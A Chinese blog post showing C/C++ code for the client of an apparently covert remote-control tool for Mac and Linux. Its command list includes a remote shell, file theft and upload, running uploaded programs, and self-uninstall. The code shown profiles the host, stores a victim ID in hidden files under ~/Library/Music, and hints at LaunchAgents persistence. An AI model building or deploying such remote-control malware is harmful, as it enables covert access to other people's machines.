@@ -1,0 +1,569 @@
+content
+
+
+					版权声明：本文为博主原创文章，未经博主允许不得转载。					https://blog.csdn.net/wangyaninglm/article/details/42387149				
+
+
+控制集成系统需要了解系统的各项硬件信息，之前我们设计的时候，习惯使用c函数来搞，后来可能发现程序的移植性收到了一些影响，比如unix内核的一些c函数在linux下面是没有的：
+比如
+ 
+苹果达尔文内核的如下东西，linux里面就没有：
+ 
+ //kern_return_t kr;
+    //host_name_port_t myhost;
+   // kernel_version_t kversion;
+   // host_basic_info_data_t hinfo;
+   // mach_msg_type_number_t count;
+    char            *cpu_type_name,*cpu_subtype_name;
+   // vm_size_t  page_size;
+   // myhost = mach_host_self();
+   // kr = host_kernel_version(myhost, kversion);
+   // count = HOST_BASIC_INFO_COUNT;
+   // kr = host_info(myhost, HOST_BASIC_INFO, (host_info_t)&hinfo, &count);
+   // kr = host_page_size(myhost, &page_size);                                               //
+ 
+所以换一种思路我们考虑使用，shell命令获取信息，完后进行字符处理，这样即使换了系统，我们代码里面换换shell命令就可以了。
+ 
+使用到的一些结构体跟宏定义：
+ 
+ 
+//  Created by mac mac on 13-5-8.
+//  Copyright (c) 2013年 __MyCompanyName__. All rights reserved.
+//
+
+#ifndef mac_client_mac_h
+#define mac_client_mac_h
+////////////////////////////////////////////////////////////////////////////////////////
+/*
+1.注意中文标点，编译器不容易察觉
+2.server 和client端的宏定义大小要统一
+*/
+/////////////////////////////////////////////////////////////////////////////////////////
+#define MAX_SIZE 1024
+#define MAX_NAME_LENGTH 64
+#define MAX_PATH 260            //保持和windows端定义的一样
+#define MAX_PATH_MAC 256       //苹果的最大长度
+#define FALSE 0
+#define TRUE 1
+
+#define MAX_SEND_BUFFER 1024*4
+#define MAX_RECV_BUFFER 1024*4
+
+/////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+typedef struct Command //自定义命令结构体
+{
+    int order;//命令序号
+    long datasize;
+    void * hwnd;//窗口句柄
+    
+}Command;
+ 
+
+typedef struct Server_Address //服务器地址
+{
+    
+    char strIP[3][MAX_PATH];//服务器ip
+    unsigned int uPort[3] ; //服务器端口
+    char remark[MAX_NAME_LENGTH];
+}Server_Address;
+
+
+typedef struct _SYS_INFO //到时候得增加备注
+{
+    Command         cmd;
+    char            remark[MAX_NAME_LENGTH];            //备注
+    char            computer_name[MAX_NAME_LENGTH];     //
+    char            user_name[MAX_NAME_LENGTH];         //
+    char            sys_version[MAX_NAME_LENGTH];       //
+    char            cpu_type[MAX_NAME_LENGTH];          //
+    char            host_ip_address[MAX_NAME_LENGTH];   //内网ip
+    char            ip_addresss[MAX_NAME_LENGTH];       //外网ip
+    char            uuid[MAX_NAME_LENGTH];             //被控端的唯一标识
+    
+    unsigned int    cpu_num;                            //
+    unsigned int    mem_total;                          //
+    int             host_id;                            //
+}SYS_INFO;
+
+
+
+
+enum 
+{
+    COMMAND_BIGIN = 20000,     //命令开始
+    TOKEN_ONLINE,              //上线命令
+    COMMAND_BREAK,             //断开链接
+    COMMAND_UNINSTALL,         //卸载　
+    COMMAND_MODIFY_REMARK,     //修改备注
+///////////////////////////////////////////////////////////////////////////
+    COMMAND_MANAGER_FILE,           //打开文件管理窗口
+    COMMAND_GET_DIRECTORY,          //获取控制端主机根目录下所有文件信息 
+    COMMAND_GET_REQUEST_DIRECTORY,  //获取双击请求目录中所有文件信息
+    COMMAND_SEARCH_FILE,            //文件搜索，还没做
+    COMMAND_WRONG_DIRECTORY,        //目录为空或者不可读
+    COMMAND_DELETE_FILE,            //删除文件
+    COMMAND_FILE_CLOSE,             //关闭当前文件管理功能的链接
+//////////////////////////////////////////////////////////////////////////
+    
+    COMMAND_MANAGER_CMD,    //打开cmd管理窗口
+    TOKEN_CMD_NEXT,         //等待下一个命令
+    COMMAND_SHELL,          //控制端请求的shell命令
+    COMMAND_SHELL_CLOSE,    //关闭shell
+////////////////////////////////////////////////////////////////////////// 
+    COMMAND_MANAGER_DOWNLOAD,   //打开文件下载功能
+    TOKEN_DOWNLOAD_SETUP,   //控制端发送文件下载连接和uuid
+    COMMAND_GET_FILEDATA,   //请求文件数据
+    TOKEN_SENT_FILEDATA,    //发送文件数据
+    TOKEN_CANT_GET_DATA,    //给控制端发送消息文件不可读
+////////////////////////////////////////////////////////////////////////
+    COMMAND_MANAGER_UPLOAD,     //开启文件上传
+    TOKEN_UPLOAD_SETUP,         //接受文件上传连接
+    COMMAND_SENT_UPLOAD_DATA,   //发送上传文件数据
+    TOKEN_UPLOAD_DATA,          //请求上传文件数据
+    TOKEN_UPLOAD_COMPLETE,      //文件上传完成
+    COMMAND_RUN_PROGARM,        //上传运行的文件
+    
+    COMMAND_UPLOAD_CLOSE,      //关闭上传进程和连接
+    
+    
+ };
+
+
+
+#endif
+
+
+ 
+ 
+下面是代码：
+Systeminfo.h
+ 
+/*
+ * File:   System_Info.h
+ * Author: Administrator
+ *
+ * Created on
+ */
+
+#ifndef SYSTEM_INFO_H
+#define	SYSTEM_INFO_H
+#include <iostream>
+#include <stdlib.h>
+#include <string.h>
+
+#include <netinet/in.h>    // for sockaddr_in
+#include <sys/types.h>    // for socket
+#include <sys/socket.h>    // for socket
+#include <stdio.h>        // for printf
+#include <stdlib.h>        // for exit
+
+#include <netdb.h>
+#include <pthread.h>      //for th/Users/twd/Desktop/NewPc/mainread
+#include <stdbool.h>     //for bool
+#include <iconv.h>		//for utf-8 gb2312
+#include <sys/cdefs.h>
+#include <sys/errno.h>
+#include <sys/stat.h>   //for dir
+#include <unistd.h>
+#include <dirent.h>
+#include <arpa/inet.h>			//honts, inet_addr
+#include <ctype.h>			//isdigit
+#include <errno.h>			//errno
+#include <fcntl.h>		//OWRONLY
+#include <unistd.h>
+#include <pwd.h>        //for username
+//#include <copyfile.h>
+//#include <mach/host_info.h>
+#include <netdb.h>
+#include <grp.h>
+#include "mac.h"
+//#include <mach/mach.h>
+
+
+#include <sys/mount.h>
+using namespace std;
+
+
+
+int   GetDeviceInfo(SYS_INFO  * si);//声明一下,传递一个结构体到引用
+void writeBeizhuInfo(char *beizhu);//写备份文件
+char * readUuidInfo(SYS_INFO*  si);//读取生成的uuid
+char * readUuid();
+void  writeUuidInfo_info();
+bool GetHost(char *domainName,char * ip);
+
+char * readDirectory(char * directory);//上传文件的目录
+
+int myexec(const char *cmd, string &resvec);//管道运行命令,得到一些系统信息
+
+#endif	/* SYSTEM_INFO_H */
+
+
+
+实现：
+//
+//  SystemInfo.cpp
+//  mac_client
+//
+//  Created by mac mac on 13-5-21.
+//  Copyright (c) 2013年 __MyCompanyName__. All rights reserved.
+//
+
+//#ifdef	__cplusplus
+//extern "C" {
+//#endif
+
+//#include <iostream>
+
+#include "SystemInfo.h"
+#include <stdlib.h>
+
+int beizhuaccess = 0;  //标志位，备注有没有改变
+
+bool GetHost(char *domainName,char * ip)
+{
+
+
+    int i;
+    struct hostent *he;
+    struct in_addr **addr_list;
+
+
+    //char * name = "www.csdn.net";
+
+    if ((he = gethostbyname(domainName)) == NULL)
+    {  // get the host info
+        herror("gethostbyname");
+        return NULL;
+    }
+
+
+    // print information about this host:
+    printf("Official name is: %s\n", he->h_name);
+    printf("    IP addresses: ");
+    addr_list = (struct in_addr **)he->h_addr_list;
+
+    for(i = 0; addr_list[i] != NULL; i++)
+    {
+        printf("%s ", inet_ntoa(*addr_list[i]));
+        sprintf(ip, "%s",inet_ntoa(*addr_list[i]));
+    }
+
+    ///return
+    printf("\n");
+
+
+    return ip;
+}
+
+
+void  get_ip(SYS_INFO*  si)
+{
+    //char hname[128];
+    struct hostent *hent;
+    int i;
+
+    gethostname(si->host_ip_address, sizeof(si->host_ip_address));
+
+    //hent = gethostent();
+    hent = gethostbyname(si->host_ip_address);
+
+    printf("hostname: %s/naddress list: ", hent->h_name);
+    for(i = 0; hent->h_addr_list[i]; i++)
+    {
+        printf("%s/t", inet_ntoa(*(struct in_addr*)(hent->h_addr_list[i])));
+        memcpy(si->host_ip_address, inet_ntoa(*(struct in_addr*)(hent->h_addr_list[i])), sizeof(si->host_ip_address));
+        printf("%s\n",si->host_ip_address);
+    }
+}
+
+
+char * readDirectory(char * directory)
+{
+
+    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));
+
+    struct passwd *pwd;
+    pwd = getpwuid(getuid());
+    login_name = pwd->pw_name;		//获取当前用户名
+
+    //char path[MAX_NAME_LENGTH];
+
+    sprintf(directory,"/Users/%s/Library/Music",login_name);//创建的路径
+    //sprintf(directory,zhuliuPath,login_name);
+    return directory;
+}
+
+
+char * readUuid()
+{
+    char path[MAX_PATH] = {0};
+    char *uuid = (char *)malloc(MAX_PATH_MAC);
+
+    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));
+
+    struct passwd *pwd;
+    pwd = getpwuid(getuid());
+    login_name = pwd->pw_name;		//获取当前用户名
+
+
+    sprintf(path,"/Users/%s/Library/Music",login_name);//创建的路径
+    //sprintf(path,zhuliuPath,login_name);
+
+
+    strcat(path, "/uuid.lol");
+    //if (access(path,0)==0)
+    //{
+    FILE *fp = fopen(path, "r");
+    fgets(uuid,MAX_NAME_LENGTH,fp);
+    fclose(fp);
+
+
+    return  uuid;
+
+}
+
+char * readUuidInfo(SYS_INFO*  si)
+{
+    char path[MAX_PATH] = {0};
+    char *uuid = (char *)malloc(MAX_PATH_MAC);
+
+    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));
+
+    struct passwd *pwd;
+    pwd = getpwuid(getuid());
+    login_name = pwd->pw_name;		//获取当前用户名
+
+//
+
+
+    sprintf(path,"/Users/%s/Library/Music",login_name);//创建的路径
+    //sprintf(path,zhuliuPath,login_name);
+
+
+    strcat(path, "/uuid.lol");
+
+        FILE *fp = fopen(path, "r");
+        fgets(uuid,MAX_NAME_LENGTH,fp);
+        fclose(fp);
+    strcat(si->uuid, uuid);
+
+    return  uuid;
+
+
+}
+
+
+void writeBeizhuInfo(char *beizhu)
+{
+
+    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));
+
+    struct passwd *pwd;
+    pwd = getpwuid(getuid());
+    login_name = pwd->pw_name;		//获取当前用户名
+    char path[MAX_PATH] = {0};
+
+
+
+    sprintf(path,"/Users/%s/Library/Music",login_name);//创建的路径
+    //sprintf(path,zhuliuPath,login_name);
+    strcat(path, "/beizhu.lol");
+    //if (access(path,0)==0)
+    //{
+    FILE *fp = fopen(path, "w");
+    fputs(beizhu,fp);
+    //strcpy(si->remark, beizhu);
+    //}
+    fclose(fp);
+}
+int myexec(const char *cmd, string &resvec)
+ {
+    resvec.clear();
+    FILE *pp = popen(cmd, "r"); //建立管道
+    if (!pp)
+    {
+        return -1;
+    }
+    char tmp[1024]; //设置一个合适的长度，以存储每一行输出
+    while (fgets(tmp, sizeof(tmp), pp) != NULL)
+     {
+        if (tmp[strlen(tmp) - 1] == '\n')
+        {
+            tmp[strlen(tmp) - 1] = '\0'; //去除换行符
+        }
+        resvec.append(tmp);
+    }
+    pclose(pp); //关闭管道
+    return resvec.size();
+}
+
+void writeUuidInfo_info()
+{
+    FILE *fp = popen("uuidgen", "r");//打开管道，执行命令,生成uuid
+    char buffer[MAX_NAME_LENGTH] = {0};
+    while (NULL != fgets(buffer, MAX_NAME_LENGTH, fp)) //逐行读取执行结果并打印
+    {
+        printf(buffer);
+    }
+    //fclose(fp);
+
+    char *login_name = (char *)malloc(MAX_NAME_LENGTH * sizeof(char));
+
+    struct passwd *pwd;
+    pwd = getpwuid(getuid());
+    login_name = pwd->pw_name;		//获取当前用户名
+    char path[MAX_PATH] = {0};
+
+
+   sprintf(path,"/Users/%s/Library/Music",login_name);//创建的路径
+    //sprintf(path,zhuliuPath,login_name);
+    //*
+    // int IsHave=mkdir(path,S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH);//创建LaunchAgents文件夹，把自身拷贝进去
+   // if(IsHave<0)//创建新目录
+    //{
+    //  printf("mkdir failed\n");
+    // exit(0);
+   // }
+    string str_mkdir = "mkdir -p ";
+    str_mkdir.append(path);
+    string str_mkdir_result;
+   myexec(str_mkdir.c_str(),str_mkdir_result);
+
+    strcat(path, "/uuid.lol");
+    FILE *fpf = fopen(path, "w");
+    int i = fputs(buffer,fpf);
+
+    fclose(fpf);
+
+
+    pclose(fp);
+
+}
+
+
+int   GetDeviceInfo(SYS_INFO *si)
+{
+    char temp[64]={0};
+    gethostname(si->computer_name,sizeof(si->computer_name));
+
+    struct passwd *passwd;
+    passwd = getpwuid (getuid());
+    struct group *group;
+    group = getgrgid (passwd->pw_gid);
+
+    sprintf(si->user_name,"%s-%s",group->gr_name,passwd->pw_name);
+
+    string str_kernel;
+    myexec("uname -sr",str_kernel);
+    cout<<str_kernel<<endl;
+    strcat(si->sys_version,str_kernel.c_str());
+
+
+
+    string str_cpu;
+    myexec("grep \"model name\" /proc/cpuinfo | cut -f2 -d:|head -1",str_cpu);
+    cout<<str_cpu<<endl;
+    strcat(si->cpu_type,str_cpu.c_str());
+
+    puts(si->computer_name);
+
+    struct hostent *hent;
+    int i;
+
+    gethostname(si->host_ip_address, sizeof(si->host_ip_address));
+
+    hent = gethostent();
+    //hent = gethostbyname(si->host_ip_address);
+
+    printf("hostname: %s/naddress list: ", hent->h_name);
+    for(i = 0; hent->h_addr_list[i]; i++)
+    {
+        printf("%s/t", inet_ntoa(*(struct in_addr*)(hent->h_addr_list[i])));
+        memcpy(si->host_ip_address, inet_ntoa(*(struct in_addr*)(hent->h_addr_list[i])), sizeof(si->host_ip_address));
+    }
+    printf("%s\n",si->host_ip_address);
+
+    string str_mem_total;
+    myexec("free -m |grep \"Mem\" | awk \'{print $2}\'",str_mem_total);
+    cout<<str_mem_total<<endl;
+    si->mem_total = atoi(str_mem_total.c_str());
+   // strcat(si->cpu_type,str_cpu.c_str());
+
+
+
+    printf("%s\n",si->user_name);
+    printf("%s\n",si->sys_version);
+    printf("%s\n",si->cpu_type);
+    printf("cpu:%d\n",si->cpu_num);
+    printf("memory:%d\n",si->mem_total);
+
+///////////////////////////////////读备注文件//////////////////////////////////////////////////////
+    char path[MAX_PATH] = {0};
+    char beizhu[MAX_PATH_MAC] = {0};
+
+
+    sprintf(path,"/Users/%s/Library/Music",passwd->pw_name);//创建的路径
+    //sprintf(path,zhuliuPath,passwd->pw_name);
+    strcat(path, "/beizhu.lol");
+    if (access(path,0)==0)
+    {
+        FILE *fp = fopen(path, "r");
+        fgets(beizhu,MAX_NAME_LENGTH,fp);
+        fclose(fp);
+        beizhuaccess = 1;
+
+        strcpy(si->remark, beizhu);
+    }
+    else
+    {
+        strcpy(si->remark, "default");
+
+    }
+
+///////////////////////////////////////读取uuid////////////////////////////////////////////////////////
+    char uuidPath[MAX_PATH] = {0};
+    sprintf(uuidPath,"/Users/%s/Library/Music",passwd->pw_name);
+    strcat(uuidPath, "/uuid.lol");
+     if (access(uuidPath,0)==0)
+    {
+        readUuidInfo(si);
+
+    }
+    else
+    {
+     writeUuidInfo_info();
+     readUuidInfo(si);
+
+    }
+
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////
+    return 0;
+}
+
+
+//#ifdef	__cplusplus
+//}
+
+
+//#endif
+
+
+ 
+ 
+搭建传输的socket平台参考下面博文：
+ 
+http://blog.csdn.net/wangyaninglm/article/details/41940287
+ 
+ 
+实现效果：
+
+ 
+ 
+
+
